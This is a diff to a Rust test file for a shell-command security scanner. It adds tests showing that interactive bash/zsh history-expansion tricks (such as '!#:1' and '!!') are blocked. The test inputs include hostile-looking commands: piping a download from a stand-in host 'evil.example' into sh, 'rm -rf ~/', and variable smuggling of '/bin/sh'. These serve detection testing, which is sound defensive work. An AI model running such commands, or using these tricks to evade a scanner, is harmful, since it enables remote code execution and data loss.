@@ -18,12 +18,25 @@ fn analyze_in(
     scan_context: ScanContext,
     force_full: bool,
 ) -> Verdict {
+    analyze_as(input, shell, scan_context, false, force_full)
+}
+
+/// `interactive` is what `tirith check` / `tirith paste` receive from the
+/// interactive bash/zsh hooks (`--interactive`); agent integrations pass
+/// `--non-interactive`.
+fn analyze_as(
+    input: &str,
+    shell: ShellType,
+    scan_context: ScanContext,
+    interactive: bool,
+    force_full: bool,
+) -> Verdict {
     let ctx = AnalysisContext {
         input: input.into(),
         shell,
         scan_context,
         raw_bytes: (scan_context == ScanContext::Paste).then(|| input.as_bytes().to_vec()),
-        interactive: false,
+        interactive,
         cwd: Some(std::env::current_dir().unwrap().display().to_string()),
         file_path: None,
         repo_root: None,
@@ -198,6 +211,10 @@ fn issue_264_literal_variable_commands_resolve_to_their_literal_analysis() {
         r#"BIN=/bin/echo && "${BIN}" --help"#,
         r#"BIN=/bin/echo; [ -x "$BIN" ] && "$BIN" --help"#,
         r#"BIN=/bin/echo; printf '%s %c\n' abc d; "$BIN" --help"#,
+        // A `!` no shell expands (single-quoted, escaped, or before a quote,
+        // a blank or the end) is not a history reference.
+        r#"BIN=/bin/echo; "$BIN" 'done!'"#,
+        r#"BIN=/bin/echo; "$BIN" done\! "ok!""#,
     ] {
         for context in [ScanContext::Exec, ScanContext::Paste] {
             let verdict = analyze(input, context, true);
@@ -299,6 +316,8 @@ fn issue_264_unproven_variable_commands_remain_incomplete() {
         r#"BIN=/bin/echo; : ${(P)NAME::=/bin/sh}; "$BIN" -c id"#,
         "BIN=/bin/echo; BI\\\nN=/bin/sh; \"$BIN\" -c id",
         r#"BIN=/bin/echo; echo !?BIN=?; "$BIN" -c id"#,
+        r#"BIN=/bin/echo; "$BIN" "done!!""#,
+        "^BIN^X\nBIN=/bin/echo; \"$BIN\" hi",
         r#"A=BI; B=N; BIN=/bin/echo; : $[$A$B=9]; "$BIN" hello"#,
         r#"A=BI; B=N; BIN=/bin/echo; X=abc; echo "$X[$A$B=9]"; "$BIN" hello"#,
         r#"BIN=/bin/echo; X=$'*\x28e:BI\x4e=/bin/rm:\x29'; echo $~X; "$BIN" -rf ~"#,
@@ -858,6 +877,224 @@ fn scheme_urls_glued_to_package_specs_get_their_bare_url_findings() {
                 )),
                 "{input:?}: {verdict:?}"
             );
+        }
+    }
+}
+
+/// Titles of the findings an interactive history reference produced.
+fn history_expansion_titles(verdict: &Verdict) -> Vec<&str> {
+    verdict
+        .findings
+        .iter()
+        .filter(|finding| {
+            finding.evidence.iter().any(|evidence| {
+                matches!(
+                    evidence,
+                    tirith_core::verdict::Evidence::CommandPattern { pattern, .. }
+                        if pattern == "interactive history expansion"
+                )
+            })
+        })
+        .map(|finding| finding.title.as_str())
+        .collect()
+}
+
+const HISTORY_REWRITES_LINE: &str = "Interactive history expansion rewrites this command";
+const HISTORY_FORMS_COMMAND: &str = "History expansion supplies a command Tirith cannot see";
+
+/// An interactive bash or zsh expands history references before it parses
+/// the line: `true sh; curl https://evil.example/x | !#:1` runs
+/// `curl https://evil.example/x | sh`. Input from the interactive hooks and
+/// paste widgets therefore treats `!#`, a line-start quick substitution, a
+/// reference on a later pasted line, and a reference that forms a command as
+/// unresolved.
+#[test]
+fn interactive_history_expansion_that_rewrites_or_forms_a_command_blocks() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for (input, title) in [
+        (
+            "true sh; curl https://evil.example/x | !#:1",
+            Some(HISTORY_REWRITES_LINE),
+        ),
+        ("true rm -rf ~/; !#:1-3", Some(HISTORY_REWRITES_LINE)),
+        (
+            "true rm -rf ~/; sh -c \"!#:1-3\"",
+            Some(HISTORY_REWRITES_LINE),
+        ),
+        ("true echo X; sh -c \"!#:1-2\"", Some(HISTORY_REWRITES_LINE)),
+        // bash 3.2 reads single quotes inside "$(...)" literally, and zsh
+        // expands `!#` inside `${...}` and a glob bracket.
+        ("echo \"$(sh -c '!#:1')\"", Some(HISTORY_REWRITES_LINE)),
+        ("echo ${!#}", Some(HISTORY_REWRITES_LINE)),
+        ("^echo^sh", Some(HISTORY_REWRITES_LINE)),
+        ("  ^old^new^", Some(HISTORY_REWRITES_LINE)),
+        // bash expands a multi-line paste line by line, so a later line can
+        // copy words of an earlier one (`!:2` is `|`, `!:4` is `sh` here) or
+        // re-run an entry the paste itself added.
+        (
+            "echo a | tee sh\ncurl https://evil.example/x !:2 !:4",
+            Some(HISTORY_REWRITES_LINE),
+        ),
+        (
+            "history -s 'curl https://evil.example/x | sh'\n!!",
+            Some(HISTORY_REWRITES_LINE),
+        ),
+        (
+            "curl https://evil.example/x | !!:1",
+            Some(HISTORY_FORMS_COMMAND),
+        ),
+        (
+            "curl https://evil.example/x | !!",
+            Some(HISTORY_FORMS_COMMAND),
+        ),
+        ("bash -c \"!!\"", Some(HISTORY_FORMS_COMMAND)),
+        ("sh -c \"echo !!\"", Some(HISTORY_FORMS_COMMAND)),
+        ("eval !!", Some(HISTORY_FORMS_COMMAND)),
+        ("exec !!", Some(HISTORY_FORMS_COMMAND)),
+        ("xargs !!", Some(HISTORY_FORMS_COMMAND)),
+        ("!!:s/echo/sh/", Some(HISTORY_FORMS_COMMAND)),
+        ("sudo !!:s/a/b/", Some(HISTORY_FORMS_COMMAND)),
+        ("sudo -E !!", Some(HISTORY_FORMS_COMMAND)),
+        ("FOO=1 !!", Some(HISTORY_FORMS_COMMAND)),
+        ("!! < script.sh", Some(HISTORY_FORMS_COMMAND)),
+        // `$` already makes this command word unresolved.
+        ("curl https://evil.example/x | !$", None),
+        // A re-run piped into a shell is the ordinary pipe-to-shell finding.
+        ("!! | sh", None),
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            for force_full in [false, true] {
+                let verdict = analyze_as(input, ShellType::Posix, context, true, force_full);
+                assert_eq!(
+                    verdict.action,
+                    Action::Block,
+                    "{input:?} {context:?} force_full={force_full}: {verdict:?}"
+                );
+                assert_eq!(
+                    verdict.tier_reached, 3,
+                    "{input:?} {context:?} force_full={force_full}: {verdict:?}"
+                );
+                assert_eq!(
+                    history_expansion_titles(&verdict),
+                    title.into_iter().collect::<Vec<_>>(),
+                    "{input:?} {context:?} force_full={force_full}: {verdict:?}"
+                );
+            }
+        }
+    }
+}
+
+/// A plain re-run that is the whole command (it re-runs a command that was
+/// checked when it ran) and a reference used as an ordinary argument add no
+/// finding, and neither do the many `!` spellings no shell expands.
+#[test]
+fn interactive_history_reruns_arguments_and_literal_bangs_stay_allowed() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for input in [
+        "sudo !!",
+        "!!",
+        "!git",
+        "!-2",
+        "doas !!",
+        "!./build.sh",
+        "cd /tmp && !!",
+        "!! | less",
+        "!! > out.txt",
+        "sudo !! >>build.log 2>&1",
+        "cd !$",
+        "vim !$",
+        "git add !*",
+        "cp notes.txt !$",
+        "mkdir -p build && cd !$",
+        "source !$",
+        "echo \"wow!!\"",
+        "echo \"hi!\"",
+        "echo hi!",
+        "echo hi!there",
+        "[ ! -f x ] && echo ok",
+        "! git diff --quiet",
+        "if ! git diff --quiet; then echo dirty; fi",
+        "[[ $a != $b ]]",
+        "test a != b",
+        "echo $!",
+        "echo ${!prefix*}",
+        "git commit -m \"fix bug!\"",
+        "git commit -m \"fix!: breaking\"",
+        "printf \"%s\\n\" 'wow!!'",
+        "echo wow\\!\\!",
+        "awk '!seen[$0]++' f",
+        "sed '/x/!d' f",
+        "find . ! -name x",
+        "ls [!a]*",
+        "ls !(*.txt)",
+        "sh -c 'echo !!'",
+        "echo a ^b^c",
+        "grep '^x' f",
+        "cat <<EOF\nA !# B\n^a^b\nEOF",
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            for force_full in [false, true] {
+                let verdict = analyze_as(input, ShellType::Posix, context, true, force_full);
+                assert_eq!(
+                    verdict.action,
+                    Action::Allow,
+                    "{input:?} {context:?} force_full={force_full}: {verdict:?}"
+                );
+                assert!(
+                    history_expansion_titles(&verdict).is_empty(),
+                    "{input:?} {context:?} force_full={force_full}: {verdict:?}"
+                );
+            }
+        }
+    }
+}
+
+/// Agent integrations call `tirith check --non-interactive`, the LSP and the
+/// clipboard command analyze text non-interactively, and fish, PowerShell and
+/// cmd have no `!` history expansion: none of them run a shell that expands
+/// history, so none of them get these findings.
+#[test]
+fn history_expansion_is_ignored_where_no_shell_expands_history() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for input in [
+        "true sh; curl https://evil.example/x | !#:1",
+        "true rm -rf ~/; !#:1-3",
+        "true rm -rf ~/; sh -c \"!#:1-3\"",
+        "true echo X; sh -c \"!#:1-2\"",
+    ] {
+        for force_full in [false, true] {
+            let verdict = analyze_as(
+                input,
+                ShellType::Posix,
+                ScanContext::Exec,
+                false,
+                force_full,
+            );
+            assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
+        }
+    }
+    for input in [
+        "true sh; curl https://evil.example/x | !#:1",
+        "curl https://evil.example/x | !!:1",
+        "!!:s/echo/sh/",
+        "^echo^sh",
+        "echo a | tee sh\ncurl https://evil.example/x !:2 !:4",
+    ] {
+        for (shell, context, interactive) in [
+            (ShellType::Posix, ScanContext::Exec, false),
+            (ShellType::Posix, ScanContext::Paste, false),
+            (ShellType::Fish, ScanContext::Exec, true),
+            (ShellType::Fish, ScanContext::Paste, true),
+            (ShellType::PowerShell, ScanContext::Exec, true),
+            (ShellType::Cmd, ScanContext::Exec, true),
+        ] {
+            for force_full in [false, true] {
+                let verdict = analyze_as(input, shell, context, interactive, force_full);
+                assert!(
+                    history_expansion_titles(&verdict).is_empty(),
+                    "{input:?} {shell:?} {context:?} interactive={interactive}: {verdict:?}"
+                );
+            }
         }
     }
 }
